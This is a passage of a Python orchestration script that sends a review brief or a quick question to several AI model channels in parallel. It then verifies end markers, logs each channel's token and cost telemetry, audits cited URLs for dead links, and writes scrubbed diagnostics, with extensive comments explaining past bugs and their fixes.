        if a.marker == "REVIEW-COMPLETE":
            a.marker = "ASK-DONE"
        if not a.only:
            a.only = [a.ask_channel]
        if a.out == "./reviews":
            a.out = os.path.join(tempfile.gettempdir(), "orchestrate-ask")
        a.no_citecheck = True        # a lookup is not a review; the audit is for cited briefs
        global _citecheck_reason
        _citecheck_reason = ("--ask is a lookup, not a review - the citation audit is for briefs "
                             "that cite sources. You did NOT pass --no-citecheck.")
        tmp = os.path.join(a.out, "ask-brief.md")
        try:
            os.makedirs(a.out, exist_ok=True)
            with open(tmp, "w", encoding="utf-8") as fh:
                fh.write(
                    "# Question\n\n%s\n\n---\n\n"
                    "Answer directly and completely. If the answer depends on something that "
                    "changes, search the web and give the URL and the date you accessed it. "
                    "If your search finds nothing, write exactly \"my search found no "
                    "confirmation\" and do NOT conclude the thing does not exist. Do not pad: "
                    "there is no length requirement here, in either direction.\n" % question)
        except OSError as exc:
            log("--ask: could not write the temporary brief (%s)" % exc)
            return 2
        a.brief = tmp

    # Start the file log before anything can fail, so a failure in validation is still recorded.
    started = time.time()
    if not a.no_log:
        try:
            os.makedirs(a.out, exist_ok=True)
            _LOG["path"] = os.path.join(a.out, "run.log")
            with open(_LOG["path"], "w", encoding="utf-8") as f:
                f.write("# model-orchestration run log - %s\n"
                        % datetime.datetime.now().astimezone().isoformat(timespec="seconds"))
        except OSError as exc:
            log("note: could not open a run log in %s (%s); continuing without one" % (a.out, exc))

    # Validate every input BEFORE the dry-run exit, so --dry-run is a real preflight. A mistyped
    # --system used to surface only after the expensive channels had already been launched.
    _resolve_system(a.system or "base-depth")
    if not a.brief:
        log("nothing to send: pass --brief <file> for a full round, or --ask \"<question>\" for "
            "a one-shot question on the cheapest channel.")
        return 2
    if not os.path.isfile(a.brief):
        log("brief not found: %s" % a.brief)
        return 2

    # Resolve WHO runs and WITH WHAT before reading the brief, so a bad route costs nothing.
    plan = None
    routing = None
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        import routing
    except Exception as e:
        # The registry is an optimisation, not a dependency: without it the old env-var defaults
        # still run. Only the selection flags genuinely need it, so only they are fatal.
        # This import must be its own try block - catching routing.RouteError below when the
        # import itself failed would raise NameError on the exception clause.
        log("routing unavailable (%r) - falling back to env defaults" % (e,))
        if a.route or a.skip or a.sets:
            return 2
    if routing is not None:
        try:
            reg = routing.load_registry()
            plan = routing.resolve(reg, route=a.route, only=a.only, skip=a.skip,
                                   sets=a.sets, tier=a.tier)
            log(routing.format_plan(plan, reg))
        except routing.RouteError as e:          # ambiguity must stop the run, never guess
            log("ROUTE ERROR: %s" % e)
            return 2

    with open(a.brief, encoding="utf-8") as f:
        brief = f.read()

    # Every channel is VERIFIED against the end marker, but until 2026-07-31 nothing ever asked
    # the model to emit one: the brief's author was silently expected to know. A brief written by
    # anyone who had not read the docs therefore came back PROBLEM on all three channels with a
    # perfectly good review inside - the worst kind of failure, because the harness looked broken
    # while the models had done their job. Measured on a two-line hand-written brief.
    #
    # Appended only when the brief does not already contain the marker, so an author who did
    # write the instruction gets no duplicate, and `--marker ""` still disables the check.
    if a.marker and a.marker not in brief:
        brief += ("\n\n---\nWhen the ENTIRE review is finished, end your reply with this exact "
                  "line and nothing after it:\n%s\n" % a.marker)
    # The default used to be a single sentence, and it reached only the HTTPS channel. Depth,
    # source discipline and output language were therefore left to whatever each model defaults
    # to - which for a terminal-tuned CLI is "short, fast, few tool calls". base-depth.md is the
    # amplifier that used to be pasted by hand into briefs; it now ships and applies everywhere.
    system = "You are an independent reviewer. You are NOT the author. Find what is wrong."
    try:
        with open(_resolve_system(a.system or "base-depth"), encoding="utf-8") as f:
            system = f.read()
    except SystemExit:
        if a.system:                      # an explicitly named preset that does not exist is fatal
            raise
        # a missing default is not: fall back to the one-liner rather than refusing to run
    # The rule that stops a failed search from becoming a false "this does not exist".
    # SKILL.md calls this "the rule that goes in every system prompt" - but until 2026-07-31 it
    # reached only the HTTPS channel, because Codex and agy had no system slot wired at all.
    # They do now (_with_system), and this is always passed, with or without --system.
    system += ('\n\nIf your search finds nothing, write exactly "my search found no confirmation" '
               "and do NOT conclude the thing does not exist. A non-existence claim is permitted "
               "only with positive evidence of absence, with that source's URL.")

    # Last point at which anything can still be stopped for free. Both files are scanned: a
    # hand-written --system file is just as capable of carrying a name or a key as the brief.
    if a.allow_pii:
        log("  note: --allow-pii is now a no-op - personal identifiers are sent by default and "
            "warned about. Use --strict-pii to refuse instead.")
    gate = pii_gate([("brief", brief), ("system", system)], strict_pii=a.strict_pii)
    if gate:
        return gate

    if plan:
        # Registry names only. This used to also inject the internal alias "http" whenever
        # "spark" was selected, because dispatch matched on that literal. With dispatch keyed on
        # `kind` the alias is not merely unnecessary, it is harmful: "http" would resolve through
        # the legacy table to kind http and launch a THIRD copy of the same endpoint, paid for
        # and reported under a name no registry entry owns.
        want = {c for c, p in plan.items() if p["enabled"]}
    else:
        # Registry unavailable: no alias table, so accept both spellings by hand rather than
        # letting the degraded path reintroduce the `--only http` failure the router just fixed.
        # Degraded path: names only, no groups, no aliases beyond these. Anything not in
        # _LEGACY_KINDS gets kind None and is reported as undispatchable rather than skipped.
        alias = {"spark": "spark11", "http": "spark11", "gemini": "agy31pro",
                 "kimi": "kimik3", "qwen": "qwen38max"}
        want = {alias.get(c, c) for c in
                (a.only or ["spark11", "spark12cont", "codex", "agy31pro", "agy36flash",
                            "kimik3", "qwen38max"])}
    if not want:
        log("every channel is disabled - nothing to run")
        return 2
    kinds = {c: ((plan or {}).get(c) or _legacy_slot(c)).get("kind") for c in want}

    # Everything below is free and answers "will this round survive?" before it is launched.
    # It runs on --dry-run too: a preflight that skips the checks a real run needs is not a
    # preflight. Previously --dry-run verified the route, the brief path and the preset, then
    # said nothing about a missing key or a missing binary - so the first evidence that Codex
    # was not installed arrived after the other two channels had already been paid for.
    preflight = list(channel_preflight(want, a.out, kinds, plan))
    for problem in preflight:
        log("  [preflight] " + problem)

    if a.dry_run:
        log("--dry-run: nothing was called")
        return 0

    os.makedirs(a.out, exist_ok=True)

    jobs, unlaunched = {}, {}
    log("brief=%d chars  tier=%s  marker=%s" % (len(brief), a.tier, a.marker))
    # Threads, not asyncio: two of the channels are blocking subprocesses, and on Windows
    # asyncio subprocess support depends on the event loop policy. Threads just work.
    #
    # 🔴 DISPATCH IS KEYED ON `kind`, NOT ON THE CHANNEL NAME. It used to be four literal
    # `if "kimi" in want:` branches, which meant channels.json's own promise - "adding a channel
    # is a change HERE, never in the code" - was false for any fifth channel: the registry entry
    # loaded, resolved, printed in the plan as [RUN ], and then nothing launched it. A registry
    # that is authoritative for four values and decorative for the fifth is the same defect as
    # `channels.spark.model`, one level up, and it would have been discovered the same way:
    # by a channel that silently never ran.
    with ThreadPoolExecutor(max_workers=max(4, len(want))) as ex:
        for cname in sorted(want):
            p = (plan or {}).get(cname) or _legacy_slot(cname)
            kind = p.get("kind")
            outfile = os.path.join(a.out, cname.upper() + ".md")
            workdir = os.path.join(a.out, cname + "-ws")
            if kind == "http":
                jobs[cname] = ex.submit(call_http_reviewer, brief, _system_for(system, p),
                                        a.tier, a.marker,
                                        model=p.get("model"), name=cname,
                                        effort=p.get("effort"))
            elif kind == "codex":
                jobs[cname] = ex.submit(call_codex, brief, a.marker, workdir, outfile,
                                        model=p.get("model"), effort=p.get("effort"),
                                        timeout=p.get("timeout"),
                                        system=_system_for(system, p))
            elif kind == "agy":
                jobs[cname] = ex.submit(call_agy, brief, a.marker, workdir, outfile,
                                        model=p.get("model"),
                                        effort=p.get("effort") or "high",
                                        timeout=p.get("timeout") or "25m",
                                        system=_system_for(system, p))
            elif kind == "hermes":
                jobs[cname] = ex.submit(call_hermes, brief, a.marker, outfile,
                                        model=p.get("model"), toolsets=p.get("toolsets"),
                                        system=_system_for(system, p))
            elif kind in ("openrouter", "oai"):
                # Two kind names, ONE implementation. `openrouter` is kept because it accurately
                # names the channels that go through OpenRouter and because existing installs
                # carry it; `oai` names a direct OpenAI-protocol vendor. The vendor itself is
                # `provider`, and an unknown one is refused inside the call rather than defaulted.
                jobs[cname] = ex.submit(call_oai_reviewer, brief, a.marker, outfile,
                                        model=p.get("model"), system=_system_for(system, p),
                                        web=p.get("web"), name=cname,
                                        reasoning=p.get("reasoning"),
                                        max_tokens=p.get("max_tokens"),
                                        fetch_tool=p.get("fetch_tool"),
                                        provider=p.get("provider") or "openrouter")
            elif kind == "xai":
                # 🔴 THE TIER TIMEOUT WAS NEVER PASSED HERE, and the plan claimed otherwise.
                # Found by codex in the round-29 panel, reviewing this very change: the tier note
                # read "no depth knob on this vendor - the tier buys nothing but wall-clock",
                # while the dispatcher passed no timeout at all and call_xai_responses fell back
                # to its 2400-second default in BOTH tiers. So `deep` was a literal no-op here,
                # and the line written to be honest about a missing lever was itself wrong about
                # the one lever that remained. A note that describes a mechanism has to be
                # checked against the mechanism.
                jobs[cname] = ex.submit(call_xai_responses, brief, a.marker, outfile,
                                        model=p.get("model"), system=_system_for(system, p),
                                        name=cname, tools=p.get("tools"),
                                        timeout=_seconds(p.get("timeout"), 2400),
                                        max_tokens=p.get("max_tokens"))
            elif kind == "gemini":
                jobs[cname] = ex.submit(call_gemini_direct, brief, a.marker, outfile,
                                        model=p.get("model"), system=_system_for(system, p),
                                        name=cname, thinking_level=p.get("thinking_level"),
                                        tools=p.get("tools"), max_tokens=p.get("max_tokens"))
            else:
                # Named in the registry, unknown to the code. A log line is NOT enough: a log
                # line scrolls, and every downstream consumer - the "N/M channels returned"
                # count, the citation audit, diagnostics - reads `results`. A channel missing
                # from that dict is indistinguishable from a channel that was never asked for,
                # while the plan printed [RUN ] for it. So it gets a real, failed result.
                log("  [%s] UNKNOWN kind %r - not launched. Known kinds: %s."
                    % (cname, kind, ", ".join(KNOWN_KINDS)))
                unlaunched[cname] = {
                    "ok": False,
                    "error": "channels.json gives this channel kind %r, which this version of "
                             "orchestrate.py cannot dispatch. Known kinds: %s. Fix the `kind` "
                             "field or disable the channel." % (kind, ", ".join(KNOWN_KINDS))}
        # 🔴 NOT a dict comprehension over f.result(). Future.result() RE-RAISES whatever the
        # worker raised, so one channel throwing would abort the comprehension and discard the
        # results of every other channel - which have already run and already been paid for.
        # Four good reviews lost to a fifth channel's crash, with an unhandled traceback in
        # place of the output. Each failure is converted into the same shape every call function
        # already returns for its own errors, so one channel dying costs exactly one channel.
        results = {}
        for cname, f in jobs.items():
            try:
                results[cname] = f.result()
            except BaseException as exc:                    # noqa: BLE001 - deliberate catch-all
                log("  [%s] RAISED: %r" % (cname, exc))
                results[cname] = {"ok": False, "error": "channel raised: %r" % (exc,),
                                  "traceback": traceback.format_exc()}
    results.update(unlaunched)
    # One authoritative assignment beats twenty literals scattered through the return statements
    # of five functions, which is where the old per-channel `"channel": "http"` lived.
    for cname, r in results.items():
        r["channel"] = cname

    log("\n" + "=" * 78)
    ok_count = 0
    for name, r in results.items():
        if r.get("text"):
            with open(os.path.join(a.out, name.upper() + ".md"), "w", encoding="utf-8") as f:
                f.write(r["text"])
        status = "OK" if r.get("ok") else "PROBLEM"
        slot = (plan or {}).get(name) or {}
        kind = slot.get("kind") or _LEGACY_KINDS.get(name)
        # 🔴 EVERY CHANNEL NAMES ITS MODEL, ON THE STATUS LINE, ALWAYS. Igor asked for this of
        # codex ("пусть отображает модель ... если я попрошу аналитику по тому, как сработала
        # оркестрация") and the request uncovered something worse: the per-channel telemetry
        # below was gated on LITERAL CHANNEL NAMES - `name == "http"` - so the round-22 rename to
        # `spark` silently switched it off. Measured in a real run log: [agy] and [kimi] printed
        # their lines, [spark] printed none at all, and the numbers survived only in
        # diagnostics.json where nobody looks. A reporting layer keyed on names is the same
        # decorative-registry defect as the dispatcher had, one floor down, and it is worse
        # there: dispatch fails loudly, reporting fails by going quiet.
        shown = slot.get("model_label") or r.get("model") or slot.get("model")
        if shown and slot.get("model") and shown != slot.get("model"):
            shown = "%s [%s]" % (shown, slot["model"])
        log("[%s] %s  %ss%s" % (name, status, r.get("seconds", "?"),
                                ("  model=%s" % shown) if shown else ""))
        if slot.get("model_overridden"):
            log("    ⚠ MODEL OVERRIDDEN: this channel is named for %s" % slot.get("model_default"))
        if r.get("error"):
            log("    error: " + str(r["error"]))
        if kind == "http" and r.get("out_tokens") is not None:
            # `in=` is the TOTAL prompt, with the cached share broken out. Printing only
            # `input_tokens` here reported 8 for a 58 KB brief, because this endpoint excludes
            # cached tokens from that field and the harness's own probe warms the cache before
            # every real call. The two numbers are also priced 50x apart on the Contributor tier
            # ($0.10/M against $0.002/M), so the split is the cost breakdown, not trivia.
            # 🔴 "in" IS A BILLING METER, NOT A CONTEXT-OCCUPANCY METER, and the old label invited
            # exactly the wrong reading. Igor caught it on 2026-08-07: the round-26 line said
            # `in=2026852` for a model whose context window is 1 048 576 - a number that cannot be
            # a prompt. It is not: on a turn with server-side web search the endpoint re-runs
            # inference once per search and reports the SUM across those internal passes. With 128
            # searches the largest single prompt was on the order of tens of thousands of tokens,
            # about 4% of the window. Same shape on the --ask probe: 280 445 reported for a
            # one-sentence question with 11 searches. Naming it `in` made it read as "how big was
            # the input", which is the counter-named-for-the-wrong-cause defect this project keeps
            # measuring - and the physical impossibility is what exposed it.
            log("    tokens billed_in=%s across %s search turn(s) - CUMULATIVE over internal "
                "passes, NOT one prompt (of which cached %s, ~50x cheaper) | out=%s | stop=%s | "
                "effort=%s | blocks=%s"
                % (r.get("in_tokens_total"), r.get("tool_calls") or 0, r.get("cached_in_tokens"),
                   r.get("out_tokens"), r.get("stop_reason"), r.get("effort"),
                   r.get("block_types")))
        if kind in ("openrouter", "oai") and r.get("out_tokens") is not None:
            # The direct channel finally has real usage numbers; Hermes reported none.
            log("    tokens in=%s (cached %s) out=%s | reasoning_chars=%s | web=%s | "
                "fetched_by_us=%s | grounding=%s%s"
                % (r.get("in_tokens"), r.get("cached_in_tokens"), r.get("out_tokens"),
                   r.get("reasoning_chars"), (slot.get("web") or {}).get("enabled", False),
                   r.get("fetched_by_us") or 0, r.get("grounding_basis"),
                   ("" if r.get("usd") is None
                    else " | cost reported BY THE PROVIDER: $%.6f" % r["usd"])))
            if r.get("vendor_searches") or r.get("vendor_pages") or r.get("vendor_citations"):
                # Named `vendor_*` and printed on its own line because it is a DIFFERENT claim
                # from the one above: these are pages the vendor says it opened, which nothing
                # here can check. Folding them into opened_urls would turn an assertion into
                # evidence, which is the move this project already caught itself making once.
                # Only the fields the vendor actually reported. Printing `searches=None
                # pages=None citations=1` reads as three measurements of which two came back
                # zero; it is one measurement and two silences, and those are different facts.
                bits = [("searches", r.get("vendor_searches")),
                        ("pages", r.get("vendor_pages")),
                        ("citations", r.get("vendor_citations"))]
                log("    vendor-side search (ITS claim, not our evidence): %s%s"
                    % (" ".join("%s=%s" % (k, v) for k, v in bits if v is not None),
                       "" if all(v is not None for _, v in bits)
                       else "  [not reported: %s]"
                            % ", ".join(k for k, v in bits if v is None)))
        if kind == "xai":
            log("    tokens in=%s (cached %s) out=%s | reasoning=%s | searches=%s | "
                "pages_opened_by_xai=%s | server_side_tools=%s | grounding=%s (we fetched "
                "nothing here - the page list is the vendor's)"
                % (r.get("in_tokens"), r.get("cached_in_tokens"), r.get("out_tokens"),
                   r.get("reasoning_tokens"), r.get("searches"), r.get("vendor_opened"),
                   r.get("server_side_tools"), r.get("grounding_basis")))
            if r.get("usd") is not None:
                # The only channel in the panel that prices its own call. Calibrated exactly
                # against the published per-token rates; see call_xai_responses.
                log("    cost reported BY THE VENDOR for this call: $%s" % r["usd"])
            log("    no effort knob on THIS MODEL - both `reasoning_effort` (top level) and "
                "`reasoning.effort` (Responses shape) return `400 Model %s does not support "
                "parameter reasoningEffort`, while an invented sibling key returns 200 and is "
                "ignored. Other xAI models do expose it; the tier reaches this channel only "
                "through its timeout." % r.get("model"))
        if kind == "codex":
            # 🔴 This block used to say "reports NO tool telemetry" full stop, which over-claimed
            # in the direction that stops you looking. Corrected 2026-08-07: no TOOL telemetry
            # (it never says which pages it opened, so the citation audit remains the only
            # grounding instrument here) but full TOKEN usage via --json, and the weekly
            # subscription state from its own rollout.
            if r.get("out_tokens") is not None:
                log("    tokens in=%s out=%s | reasoning=%s | cached_in=%s | effort=%s"
                    % (r.get("in_tokens"), r.get("out_tokens"), r.get("reasoning_tokens"),
                       r.get("cached_in_tokens"), slot.get("effort")))
            else:
                log("    effort=%s | no usage block in the event stream (older CLI, or --json "
                    "output was not captured)" % slot.get("effort"))
            rl = r.get("rate_limit") or {}
            if rl.get("used_percent") is not None:
                hrs = round((rl.get("window_minutes") or 0) / 60.0)
                log("    subscription: %.1f%% of the %sh window used%s%s"
                    % (rl["used_percent"], hrs,
                       (", resets %s" % rl["resets_at"]) if rl.get("resets_at") else "",
                       (" | plan=%s credits=%s" % (rl.get("plan_type"), rl.get("has_credits")))))
                if rl["used_percent"] >= 95:
                    log("    ⚠ WEEKLY LIMIT ESSENTIALLY EXHAUSTED - further runs draw on credits. "
                        "Switch channel rather than opening a metered API path.")
            log("    no TOOL telemetry on this channel: it never reports which pages it opened, "
                "so the citation audit below is the only grounding instrument that works here")
        if kind == "agy" and r.get("tool_calls") is not None:
            # This channel used to report nothing at all about its own work, so a fluent answer
            # written entirely from training data was indistinguishable from a researched one.
            # `errors=` is printed SEPARATELY from `denied=` since 2026-08-07: they had shared a
            # counter under the name of the rarer and scarier one, so a failed fetch was reported
            # as a permission denial and pointed the reader at the wrong fix.
            log("    thinking=%s out=%s | tools=%s (search/fetch=%s) denied=%s errors=%s | "
                "agy_status=%s perms=%s"
                % (r.get("thinking"), r.get("out_tokens"), r.get("tool_calls"),
                   r.get("searches"), r.get("denied"), r.get("tool_errors"), r.get("agy_status"),
                   r.get("perm_mode")))
            if r.get("events"):
                log("    event log: %s" % r["events"])
        if kind == "gemini":
            # 🔴 THIS BRANCH DID NOT EXIST AND THE CHANNEL REPORTED NOTHING. Caught 2026-08-08 in
            # a live smoke run: goog36flash printed `bytes=521 exit=None` and no tokens, no
            # searches, no pages - while every other kind printed a telemetry line. It is the
            # third instance of the same defect (four literal channel names swallowing a fifth
            # channel; per-channel telemetry keyed on pre-rename literals), and it survived
            # BECAUSE the branch is an `if kind ==` chain: adding a kind to the dispatcher is
            # loud, forgetting it in the reporter is silent. Dispatch fails; reporting goes quiet.
            log("    tokens in=%s (cached %s) out=%s | thought=%s | tool-content=%s | "
                "searches=%s | pages opened BY GOOGLE=%s | grounding=%s"
                % (r.get("in_tokens"), r.get("cached_in_tokens"), r.get("out_tokens"),
                   r.get("reasoning_tokens"), r.get("tool_tokens"), r.get("searches"),
                   r.get("vendor_opened"), r.get("grounding_basis")))
            log("    thinking_level is the tier's lever here (medium on strategic, high on deep) "
                "- the claim that this API has no depth knob was wrong; see channels.json")
        if r.get("bytes"):
            log("    bytes=%s exit=%s" % (r["bytes"], r.get("exit")))
        for w in r.get("warnings", []):
            log("    FAIL: " + w)
        for n in r.get("notes", []):
            log("    note: " + n)
        ok_count += bool(r.get("ok"))

    log("=" * 78)
    log("%d/%d channels returned a verified review. Outputs in %s"
        % (ok_count, len(results), os.path.abspath(a.out)))

    # 🔴 WHAT DID THIS ROUND COST? Until 2026-08-08 the honest answer was "nobody knows", and the
    # reason was not that the vendors hide it - OpenRouter returns `usage.cost` on a request this
    # harness was ALREADY making, and xAI returns a tick count. We read xAI's and dropped
    # OpenRouter's, then wrote in the registry that xAI was "the only channel in the panel that
    # prices its own call". It was the only one we asked.
    #
    # The total is deliberately PARTIAL and says so. Codex and agy run on subscriptions and
    # report no price; the Spark channels are billed per token against a rate this file does not
    # hold. A total that silently omitted them while looking complete would be worse than none -
    # the same failure as a `grounded` column that mixed evidence with assertion.
    priced = {c: r["usd"] for c, r in results.items() if r.get("usd") is not None}
    if priced:
        unpriced = sorted(c for c in results if c not in priced)
        log("cost reported BY THE VENDORS for this round: $%.4f across %d channel(s) (%s)"
            % (sum(priced.values()), len(priced),
               ", ".join("%s $%.4f" % (c, v) for c, v in sorted(priced.items()))))
        if unpriced:
            log("  NOT INCLUDED - these channels report no price: %s. Subscription channels "
                "(codex, agy) never will; the rest bill per token at a rate this harness does "
                "not hold. This total is a floor, not the bill." % ", ".join(unpriced))

    # ---- citation audit ---------------------------------------------------------------------
    # Runs on every review, because the alternative - a separate command afterwards - is a check
    # that gets skipped exactly when the run was rushed. See citation_audit() for why existence
    # rather than grounding, and why it never touches the exit code.
    audit = citation_audit(results, enabled=not a.no_citecheck)
    log_citation_audit(audit)

    # ---- diagnostics ------------------------------------------------------------------------
    # Written on every run, success included: the most common support question is "it worked
    # yesterday", and answering it needs the working run's file to diff against.
    problems = []
    for name, r in results.items():
        for text in ([r.get("error")] if r.get("error") else []) + list(r.get("warnings", [])):
            cause, fix = diagnose(str(text))
            problems.append({"channel": name, "detail": str(text),
                             "likely_cause": cause, "suggested_fix": fix})
    # A missing binary is reported twice - once by the preflight, once by the channel that then
    # failed on it - and printing the same advice four times reads like four separate faults.
    # Keep the channel-level entry, which names the channel, and drop the preflight echo.
    seen = {(p["channel"], p["likely_cause"]) for p in problems}
    causes = {p["likely_cause"] for p in problems}
    for p in preflight:
        cause, fix = diagnose(p)
        if cause and cause not in causes:
            problems.append({"channel": "preflight", "detail": p,
                             "likely_cause": cause, "suggested_fix": fix})
            causes.add(cause)
    deduped, keys = [], set()
    for p in problems:
        k = (p["channel"], p["likely_cause"], p["detail"])
        if k not in keys:
            keys.add(k)
            deduped.append(p)
    problems = deduped

    diag = write_diagnostics(a.out, {
        "schema": "model-orchestration/diagnostics/1",
        "how_to_read_this":
            "A machine-readable account of one review run. It is scrubbed of secrets and "
            "personal identifiers by construction, so it is safe to paste into a chat or attach "
            "to a bug report. `problems` is the part to act on: each entry carries the raw "
            "detail plus a plain-language cause and a suggested fix. `channels` shows what each "
            "reviewer actually did - a channel with ok=false still often produced usable text, "
            "which is saved beside this file. `environment` shows what is installed; a missing "
            "key or a missing CLI is a normal, non-fatal condition and only disables that one "
            "channel.",
        "generated_at": datetime.datetime.now().astimezone().isoformat(timespec="seconds"),
        "seconds": round(time.time() - started, 1),
        "ok_channels": ok_count,
        "total_channels": len(results),
        "invocation": {"tier": a.tier, "marker": a.marker, "system": a.system or "base-depth",
                       "only": a.only, "skip": a.skip, "route": a.route, "sets": a.sets,
                       "brief_chars": len(brief), "strict_pii": a.strict_pii,
                       "ask_mode": ask_mode,
                       # The preset NAME is not what each channel received. See _record_system:
                       # per-channel hints and suffixes make the effective system prompt differ,
                       # and comparing reviews without knowing that is comparing bundles while
                       # believing you are comparing models.
                       "effective_system_per_channel": dict(_SYSTEM_SEEN),
                       "identical_system_for_all": len({v["sha256_12"]
                                                        for v in _SYSTEM_SEEN.values()}) <= 1},
        "environment": environment_report(want),
        "plan": plan,
        "preflight": preflight,
        "problems": problems,
        "citations":
            {"how_to_read_this":
                "Per channel: how many URLs the review cited and what happened when each was "
                "fetched. DEAD (404/410) is the one that matters - a citation to a page that "
                "does not exist was constructed, not read. BLOCKED and UNKNOWN mean the check "
                "could not be completed and are never evidence of fabrication. This checks "
                "EXISTENCE, which works on every channel; whether the model actually opened a "
                "page needs that channel's tool telemetry, which Codex does not report at all.",
             "results": audit},
        "channels": {n: {k: v for k, v in r.items() if k != "text"} for n, r in results.items()},
        "console": _LOG["lines"],
    }) if not a.no_log else None

    if problems:
        log("\n%d problem(s) recorded. Plain-language cause and fix for each:" % len(problems))
        for p in problems:
            if p["likely_cause"]:
                log("  [%s] %s" % (p["channel"], p["likely_cause"]))
                log("      -> %s" % p["suggested_fix"])
    if diag:
        log("\nDiagnostics: %s" % diag)
        log("If something went wrong, hand that file to an AI assistant and ask it to fix the "
            "cause - it is scrubbed of keys and personal data and contains everything needed.")

    # In --ask mode the ANSWER is the product, not the round summary. Printing the path to a file
    # and stopping there is what makes a cheap channel expensive to consult: the cost that decides
    # whether a lookup happens is the number of steps, not the number of cents.
    if ask_mode:
        for name, r in results.items():
            body = (r.get("text") or "").strip()
            if a.marker and body.endswith(a.marker):
                body = body[:-len(a.marker)].rstrip()
            print("\n" + "=" * 78)
            print("ANSWER  [%s]%s" % (name, "" if r.get("ok") else "   ⚠ the channel reported a "
                                                                  "problem - read the log above"))
            print("=" * 78)
            print(body if body else "(empty answer - see the warnings above)")
        return 0 if ok_count else 1

    log("Now report, per channel: accepted / rejected with proof / where they disagreed. "
        "The disagreement is the product.")
    return 0 if ok_count else 1


def _crash_handler():
    """
    Turn an unexpected exception into a diagnostics file instead of a bare traceback.

    A traceback on a terminal is lost the moment the window closes, and it is the one thing a
    user cannot usefully relay ("it says something about line 812"). Writing it to disk, scrubbed,
    means the next question - "send me the file" - has an answer that costs the user nothing.
    """
    try:
        return main()
    except KeyboardInterrupt:
        log("\ninterrupted by user")
        return 130
    except SystemExit:
        raise
    except BaseException as exc:                       # noqa: BLE001 - deliberate catch-all
        tb = traceback.format_exc()
        log("\nUNEXPECTED ERROR: %s: %s" % (type(exc).__name__, exc))
        out = "./reviews"
        for i, arg in enumerate(sys.argv):
            if arg == "--out" and i + 1 < len(sys.argv):
                out = sys.argv[i + 1]
        cause, fix = diagnose(str(exc) + "\n" + tb)
        path = write_diagnostics(out, {
            "schema": "model-orchestration/diagnostics/1",
            "how_to_read_this":
                "This run crashed. `traceback` is the Python failure; it is scrubbed of secrets "
                "and personal identifiers, so it is safe to paste into a chat or a bug report. "
                "Give it to an AI assistant with the request to diagnose and fix the cause.",
            "generated_at": datetime.datetime.now().astimezone().isoformat(timespec="seconds"),
            "crashed": True,
            "error_type": type(exc).__name__,
            "error": str(exc),
            "traceback": tb,
            "likely_cause": cause,
            "suggested_fix": fix,
            "argv": sys.argv[1:],
            "environment": environment_report(),
            "console": _LOG["lines"],
        })
        if path:
            log("Diagnostics written to %s - hand that file to an AI assistant and ask it to "
                "diagnose the cause. It contains no keys and no personal data." % path)
        else:
            log(tb)
        return 1


if __name__ == "__main__":
    sys.exit(_crash_handler())
